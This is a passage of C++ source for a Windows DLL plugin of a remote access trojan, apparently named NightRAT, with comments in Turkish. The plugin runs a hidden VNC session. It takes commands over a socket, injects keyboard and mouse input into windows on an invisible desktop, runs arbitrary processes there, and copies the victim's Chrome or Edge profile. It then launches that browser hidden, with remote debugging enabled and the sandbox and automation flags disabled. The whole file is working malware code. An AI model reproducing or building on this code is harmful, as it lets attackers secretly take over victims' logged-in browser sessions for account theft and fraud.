        DWORD foreThreadId = hFore ? GetWindowThreadProcessId(hFore, NULL) : 0;
        DWORD targetThreadId = GetWindowThreadProcessId(hRoot, NULL);
        DWORD currentThreadId = GetCurrentThreadId();

        if (foreThreadId && foreThreadId != targetThreadId) {
            AttachThreadInput(targetThreadId, foreThreadId, TRUE);
            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
            SetForegroundWindow(hRoot);
            SetFocus(hRoot);
            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
            AttachThreadInput(targetThreadId, foreThreadId, FALSE);
        } else {
            SetForegroundWindow(hRoot);
            SetFocus(hRoot);
        }
    }

    SendMessageW(hRoot, WM_MOUSEACTIVATE, (WPARAM)hRoot, MAKELPARAM(ht, msg));
}

// -----------------------------------------------------------------------
//  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
// -----------------------------------------------------------------------
static HWND GetFocusedWindow() {
    HWND hTarget = g_hCurrentFocus;
    if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
    if (!hTarget || !IsWindow(hTarget)) hTarget = g_hLastWindow;
    if (!hTarget || !IsWindow(hTarget)) return NULL;

    DWORD threadId = GetWindowThreadProcessId(hTarget, NULL);
    GUITHREADINFO gti = { sizeof(GUITHREADINFO) };
    if (GetGUIThreadInfo(threadId, &gti)) {
        if (gti.hwndFocus) return gti.hwndFocus;
        if (gti.hwndCaret) return gti.hwndCaret;
    }
    return hTarget;
}

// -----------------------------------------------------------------------
//  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
// -----------------------------------------------------------------------
static void input_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }

    bool ctrlDown = false;
    bool altDown = false;
    bool shiftDown = false;

    while (g_inputRunning) {
        InputTask task;
        {
            unique_lock<mutex> lock(g_inputMutex);
            g_inputCV.wait(lock, [] { return !g_inputQueue.empty() || !g_inputRunning; });
            if (!g_inputRunning) {
                g_inputQueue.clear();
                break;
            }
            task = g_inputQueue.front();
            g_inputQueue.pop_front();
        }

        const string& action = task.action;
        const json&   cmd    = task.cmd;

        // ---- Klavye ----
        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
            int vk = cmd.value("keycode", 0);
            HWND hTarget = WindowFromPoint(g_lastMousePos);
            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
            if (!hTarget || !IsWindow(hTarget)) continue;

            if (action == "hvnc_keydown") {
                if (is_ctrl_key(vk)) ctrlDown = true;
                if (is_alt_key(vk)) altDown = true;
                if (is_shift_key(vk)) shiftDown = true;
                send_keyboard_message(hTarget, WM_KEYDOWN, (WPARAM)vk,
                                      key_lparam((WORD)vk, false),
                                      ctrlDown, altDown, shiftDown);
            } else if (action == "hvnc_keyup") {
                if (is_ctrl_key(vk)) ctrlDown = false;
                if (is_alt_key(vk)) altDown = false;
                if (is_shift_key(vk)) shiftDown = false;
                send_keyboard_message(hTarget, WM_KEYUP, (WPARAM)vk,
                                      key_lparam((WORD)vk, true),
                                      ctrlDown, altDown, shiftDown);
            } else if (action == "hvnc_char") {
                send_keyboard_message(hTarget, WM_CHAR, (WPARAM)vk, 1,
                                      ctrlDown, altDown, shiftDown);
            }
            request_full_frame(true);
            continue;
        }

        // ---- Mouse ----
        if (action.find("hvnc_mouse") == string::npos && action != "hvnc_doubleclick") continue;

        int normX = cmd.value("x", 0);
        int normY = cmd.value("y", 0);
        POINT screenPt = screen_pt(normX, normY);
        g_lastMousePos = screenPt;

        if (action == "hvnc_mousemove") {
            request_full_frame(false);
            SetCursorPos(screenPt.x, screenPt.y);
            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);

            HWND hwnd = WindowFromPoint(screenPt);
            if (hwnd) {
                POINT clientPt = screenPt;
                ScreenToClient(hwnd, &clientPt);
                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));

                LRESULT ht = HTCLIENT;
                if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                        SMTO_ABORTIFHUNG, 50, (PDWORD_PTR)&ht)) {
                    PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE));
                }
            }

            if (g_dragging && g_dragHwnd) {
                int dx = screenPt.x - g_dragStartPt.x;
                int dy = screenPt.y - g_dragStartPt.y;

                if (g_dragHitTest == HTCAPTION) {
                    int newX = g_dragStartRect.left + dx;
                    int newY = g_dragStartRect.top  + dy;
                    SetWindowPos(g_dragHwnd, NULL, newX, newY, 0, 0,
                                 SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
                } else {
                    RECT rc = g_dragStartRect;
                    int  w  = rc.right  - rc.left;
                    int  h  = rc.bottom - rc.top;

                    switch (g_dragHitTest) {
                        case HTRIGHT:        w += dx; break;
                        case HTBOTTOM:       h += dy; break;
                        case HTBOTTOMRIGHT:  w += dx; h += dy; break;
                        case HTLEFT:         rc.left += dx; w -= dx; break;
                        case HTTOP:          rc.top  += dy; h -= dy; break;
                        case HTTOPLEFT:      rc.left += dx; w -= dx; rc.top += dy; h -= dy; break;
                        case HTTOPRIGHT:     w += dx; rc.top += dy; h -= dy; break;
                        case HTBOTTOMLEFT:   rc.left += dx; w -= dx; h += dy; break;
                        default: break;
                    }
                    if (w < 100) w = 100;
                    if (h < 50) h = 50;
                    SetWindowPos(g_dragHwnd, NULL, rc.left, rc.top, w, h,
                                 SWP_NOZORDER | SWP_NOACTIVATE);
                }
            } else {
                HWND hwnd = WindowFromPoint(screenPt);
                if (hwnd) {
                    LRESULT ht = HTCLIENT;
                    if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                          SMTO_ABORTIFHUNG, 50, (PDWORD_PTR)&ht)) {
                        SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE),
                                          SMTO_ABORTIFHUNG, 50, NULL);
                    }
                }
            }
            continue;
        }

        if (action == "hvnc_mousedown") {
            request_full_frame(true);
            int btn = cmd.value("button", 0);
            if (btn < 0 || btn > 2) btn = 0;

            HWND hwnd = target_window_from_screen_point(screenPt);
            if (!hwnd) hwnd = WindowFromPoint(screenPt);

            if (hwnd) {
                LRESULT ht = HTCLIENT;
                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);

                if (ht != HTCLIENT && btn == 0) {
                    HWND hRoot = GetAncestor(hwnd, GA_ROOT);
                    if (hRoot) {
                        if (ht == HTCLOSE) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0); continue; }
                        else if (ht == HTMINBUTTON) { PostMessageW(hRoot, WM_SYSCOMMAND, SC_MINIMIZE, 0); continue; }
                        else if (ht == HTMAXBUTTON) {
                            WINDOWPLACEMENT wp = { sizeof(wp) };
                            GetWindowPlacement(hRoot, &wp);
                            if (wp.showCmd == SW_SHOWMAXIMIZED) PostMessageW(hRoot, WM_SYSCOMMAND, SC_RESTORE, 0);
                            else PostMessageW(hRoot, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                            continue;
                        }

                        if (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT || ht == HTTOP || ht == HTBOTTOM ||
                            ht == HTTOPLEFT || ht == HTTOPRIGHT || ht == HTBOTTOMLEFT || ht == HTBOTTOMRIGHT) {
                            g_dragging = true;
                            g_dragHwnd = hRoot;
                            g_dragStartPt = screenPt;
                            g_dragHitTest = ht;
                            GetWindowRect(hRoot, &g_dragStartRect);
                            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
                            continue;
                        }
                    }
                }

                UINT mouseMsg = mouse_message_for_button(btn, true);
                activate_target_window(hwnd, mouseMsg, ht);
                g_hCurrentFocus = hwnd;
                g_mouseDownTarget[btn] = hwnd;

                POINT clientPt = screenPt;
                ScreenToClient(hwnd, &clientPt);
                LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);

                SetCursorPos(screenPt.x, screenPt.y);
                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                PostMessageW(hwnd, WM_MOUSEMOVE, mouse_wparam_for_button(btn, true), lParam);
                PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, true), lParam);
            }
            continue;
        }

        if (action == "hvnc_mouseup") {
            request_full_frame(true);
            int btn = cmd.value("button", 0);
            if (btn < 0 || btn > 2) btn = 0;

            if (btn == 0 && g_dragging) {
                g_dragging = false;
                g_dragHwnd = NULL;
                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
                continue;
            }

            HWND hwnd = g_mouseDownTarget[btn];
            if (!hwnd || !IsWindow(hwnd)) hwnd = target_window_from_screen_point(screenPt);
            if (!hwnd) hwnd = WindowFromPoint(screenPt);

            if (hwnd) {
                LRESULT ht = HTCLIENT;
                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);

                UINT mouseMsg = mouse_message_for_button(btn, false);
                POINT clientPt = screenPt;
                ScreenToClient(hwnd, &clientPt);

                SetCursorPos(screenPt.x, screenPt.y);
                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, mouseMsg));
                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
                PostMessageW(hwnd, mouseMsg, mouse_wparam_for_button(btn, false), MAKELPARAM(clientPt.x, clientPt.y));
            }
            g_mouseDownTarget[btn] = NULL;
            continue;
        }

        if (action == "hvnc_doubleclick") {
            request_full_frame(true);
            int btn = cmd.value("button", 0);
            if (btn < 0 || btn > 2) btn = 0;

            HWND hwnd = target_window_from_screen_point(screenPt);
            if (!hwnd) hwnd = WindowFromPoint(screenPt);

            if (hwnd) {
                LRESULT ht = HTCLIENT;
                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);

                UINT downMsg = mouse_message_for_button(btn, true);
                UINT upMsg   = mouse_message_for_button(btn, false);
                UINT dblMsg  = mouse_message_for_button(btn, true, btn == 0);

                activate_target_window(hwnd, downMsg, ht);

                POINT clientPt = screenPt;
                ScreenToClient(hwnd, &clientPt);
                LPARAM lParam = MAKELPARAM(clientPt.x, clientPt.y);
                WPARAM downWParam = mouse_wparam_for_button(btn, true);
                WPARAM upWParam   = mouse_wparam_for_button(btn, false);

                SetCursorPos(screenPt.x, screenPt.y);
                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, downMsg));
                PostMessageW(hwnd, WM_MOUSEMOVE, downWParam, lParam);
                PostMessageW(hwnd, downMsg, downWParam, lParam);
                PostMessageW(hwnd, upMsg, upWParam, lParam);
                PostMessageW(hwnd, dblMsg, downWParam, lParam);
                PostMessageW(hwnd, upMsg, upWParam, lParam);
            }
            continue;
        }
    }
}

static wstring utf8_to_wstring(const string& str) {
    if (str.empty()) return wstring();
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return wstring();
    wstring res(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (!res.empty() && res.back() == L'\0') res.pop_back();
    return res;
}

static string wstring_to_utf8(const wstring& wstr) {
    if (wstr.empty()) return string();
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (size <= 0) return string();
    string res(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
    if (!res.empty() && res.back() == '\0') res.pop_back();
    return res;
}

static wstring get_app_path(const wstring& appName) {
    HKEY hKey;
    wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
    wstring path;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            path = buffer;
        }
        RegCloseKey(hKey);
    }
    if (path.empty()) {
        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buffer[MAX_PATH];
            DWORD size = sizeof(buffer);
            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
                path = buffer;
            }
            RegCloseKey(hKey);
        }
    }
    return path;
}

static wstring get_browser_profile_path(const wstring& browserName) {
    wchar_t szPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";

    wstring path = szPath;
    if (browserName == L"Google Chrome") {
        path += L"\\Google\\Chrome\\User Data";
    } else if (browserName == L"Microsoft Edge") {
        path += L"\\Microsoft\\Edge\\User Data";
    } else {
        return L"";
    }
    return path;
}

static bool copy_recursive(const fs::path& src, const fs::path& dst) {
    try {
        if (!fs::exists(src)) return false;
        if (!fs::exists(dst)) fs::create_directories(dst);

        for (const auto& entry : fs::directory_iterator(src)) {
            const auto& path = entry.path();
            wstring name = path.filename().wstring();

            // Skip lock files
            if (name == L"SingletonLock" || name == L"Parent.lock") continue;

            // Skip bulky directories
            if (entry.is_directory()) {
                if (name == L"Cache" || name == L"Code Cache" || name == L"GPUCache" ||
                    name == L"Service Worker" || name == L"Media Cache" ||
                    name == L"WebStorage" || name == L"crash_reporter" ||
                    name == L"GrShaderCache") continue;

                if (!copy_recursive(path, dst / name)) return false;
            } else {
                if (!CopyFileW(path.wstring().c_str(), (dst / name).wstring().c_str(), FALSE)) {
                    // Ignore errors for individual files to be robust
                }
            }
        }
        return true;
    } catch (...) {
        return false;
    }
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    initialize_visual_styles();
    g_socket = sock;
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    try {
        json   cmd    = json::parse(cmdJson);
        string action = cmd.value("action", "");
        g_socket = sock;
        initialize_visual_styles();

        if (action == "hvnc_start") {
            g_scalePercent = cmd.value("quality", 50);
            if (g_scalePercent < 10) g_scalePercent = 10;
            if (g_scalePercent > 100) g_scalePercent = 100;
            g_staticFrameCount = 0;
            request_full_frame(true);
            if (!g_captureRunning && !g_encodeRunning && !g_sendRunning) {
                clear_frame_pipeline();
            }
            if (!g_sendRunning.exchange(true)) {
                if (g_sendThread.joinable()) g_sendThread.join();
                g_sendThread = thread(send_worker);
            }
            if (!g_encodeRunning.exchange(true)) {
                if (g_encodeThread.joinable()) g_encodeThread.join();
                g_encodeThread = thread(encode_worker);
            }
            if (!g_captureRunning.exchange(true)) {
                if (g_captureThread.joinable()) g_captureThread.join();
                g_captureThread = thread(capture_loop);
            }
            if (!g_inputRunning.exchange(true)) {
                if (g_inputThread.joinable()) g_inputThread.join();
                g_inputThread = thread(input_loop);
            }
        } else if (action == "hvnc_stop") {
            g_captureRunning = false;
            g_encodeRunning  = false;
            g_sendRunning    = false;
            g_inputRunning   = false;
            g_frameCV.notify_all();
            g_sendCV.notify_all();
            g_inputCV.notify_all();
            if (g_captureThread.joinable()) g_captureThread.join();
            if (g_encodeThread.joinable())  g_encodeThread.join();
            if (g_sendThread.joinable())    g_sendThread.join();
            if (g_inputThread.joinable())   g_inputThread.join();
            release_all_bitmap_slots();
            g_dragging = false;
            g_dragHwnd = NULL;
            g_mouseDownTarget[0] = NULL;
            g_mouseDownTarget[1] = NULL;
            g_mouseDownTarget[2] = NULL;
            g_staticFrameCount = 0;
            g_forceFullFrame = false;
            g_lastInteractiveFullFrameTick = 0;
            {
                lock_guard<mutex> lock(g_inputMutex);
                g_inputQueue.clear();
            }
        } else if (action == "hvnc_quality") {
            lock_guard<mutex> lock(g_captureMutex);
            g_scalePercent = cmd.value("quality", 50);
            if (g_scalePercent < 10) g_scalePercent = 10;
            if (g_scalePercent > 100) g_scalePercent = 100;
            g_staticFrameCount = 0;
            request_full_frame(true);
        } else if (action == "hvnc_run") {
            string requestedPath = cmd.value("path", "cmd.exe");
            wstring wRequestedPath = utf8_to_wstring(requestedPath);

            bool isBrowser = (wRequestedPath == L"Google Chrome" ||
                              wRequestedPath == L"Microsoft Edge");

            if (isBrowser) {
                thread([wRequestedPath]() {
                    ensure_desktop();
                    if (!g_hHiddenDesktop) return;

                    wstring exeName;
                    if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                    else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";

                    wstring exePath = get_app_path(exeName);
                    if (exePath.empty()) {
                        send_error("Browser executable not found.");
                        return;
                    }

                    wstring sourceUserData = get_browser_profile_path(wRequestedPath);
                    if (sourceUserData.empty()) {
                        send_error("User Data directory not found.");
                        return;
                    }

                    wchar_t tempPath[MAX_PATH];
                    GetTempPathW(MAX_PATH, tempPath);
                    wstring profilePath = tempPath;
                    profilePath += L"NightRAT_";
                    profilePath += exeName;
                    profilePath += L"_Profile";

                    // Mevcut kopya varsa temizle
                    try {
                        if (fs::exists(profilePath)) fs::remove_all(profilePath);
                    } catch (...) {}

                    send_status("Profiller kopyalanıyor...");
                    if (!copy_recursive(fs::path(sourceUserData), fs::path(profilePath))) {
                        send_error("Failed to copy browser profile.");
                        return;
                    }

                    // İlk profili tespit et (Default veya Profile 1)
                    wstring profileDir = L"Default";
                    WIN32_FIND_DATAW findData;
                    HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
                    if (hFind != INVALID_HANDLE_VALUE) {
                        do {
                            wstring name = findData.cFileName;
                            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                                (name == L"Default" || name.find(L"Profile ") == 0)) {
                                profileDir = name;
                                break;
                            }
                        } while (FindNextFileW(hFind, &findData));
                        FindClose(hFind);
                    }

                    send_status("Tarayıcı başlatılıyor...");

                    // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
                    wstring args = L" --remote-debugging-port=9222"
                                   //L" --user-data-dir=\"" + profilePath + L"\""
                                   //L" --profile-directory=\"" + profileDir + L"\""
                                   L" --no-sandbox"
                                   L" --disable-gpu"
                                   L" --window-size=1280,720"
                                   L" --window-position=0,0"
                                   L" --no-first-run"
                                   L" --no-default-browser-check"
                                   L" --disable-background-networking"
                                   L" --disable-sync"
                                   L" --disable-translate"
                                   L" --metrics-recording-only"
                                   L" --safebrowsing-disable-auto-update"
                                   L" --disable-setuid-sandbox"
                                   L" --disable-infobars"
                                   L" --disable-gpu-compositing"
                                   L" --force-cpu-draw"
                                   //L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity"
                                   //L" --password-store=basic"
                                   L" --disable-encryption-win"
                                   L" --restore-last-session"
                                   //L" --allow-profiles-outside-user-dir"
                                   L" --no-pings"
                                   L" --disable-notifications"
                                   L" --disable-component-update"
                                   L" --disable-blink-features=AutomationControlled"
                                   L" --disable-backgrounding-occluded-windows"
                                   L" --disable-renderer-backgrounding"
                                   L" --remote-allow-origins=*"
                                   L" --lang=en-US";

                    wstring fullCmd = L"\"" + exePath + L"\"" + args;
                    vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
                    cmdLine.push_back(L'\0');

                    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
                    STARTUPINFOW si = { sizeof(si) };
                    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
                    si.dwFlags      = STARTF_USESHOWWINDOW;
                    si.wShowWindow  = SW_SHOWNORMAL;

                    PROCESS_INFORMATION pi = { 0 };
                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                       0, NULL, NULL, &si, &pi)) {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        request_full_frame(true);
                        send_status("Browser started on hidden desktop");
                    } else {
                        send_error("Failed to start browser. Error: " + to_string(GetLastError()));
                    }
                }).detach();
            } else {
                ensure_desktop();
                if (!g_hHiddenDesktop) return;

                vector<wchar_t> cmdLine(wRequestedPath.begin(), wRequestedPath.end());
                cmdLine.push_back(L'\0');

                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
                STARTUPINFOW si = { sizeof(si) };
                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
                si.dwFlags      = STARTF_USESHOWWINDOW;
                si.wShowWindow  = SW_SHOW;

                PROCESS_INFORMATION pi = { 0 };
                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    request_full_frame(true);
                    send_status("Process started on hidden desktop");
                } else {
                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
                }
            }
        } else if (action.find("hvnc_mouse") != string::npos ||
                   action.find("hvnc_key")   != string::npos ||
                   action == "hvnc_char" ||
                   action == "hvnc_doubleclick") {
            lock_guard<mutex> lock(g_inputMutex);
            if (action == "hvnc_mousemove") {
                while (!g_inputQueue.empty() && g_inputQueue.back().action == "hvnc_mousemove") {
                    g_inputQueue.pop_back();
                }
            }
            while (g_inputQueue.size() > 128) {
                g_inputQueue.pop_front();
            }
            g_inputQueue.push_back({action, cmd});
            g_inputCV.notify_one();
        }
    } catch (...) {}
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning = false;
        g_encodeRunning  = false;
        g_sendRunning    = false;
        g_inputRunning   = false;
        g_frameCV.notify_all();
        g_sendCV.notify_all();
        g_inputCV.notify_all();
    }
    return TRUE;
}
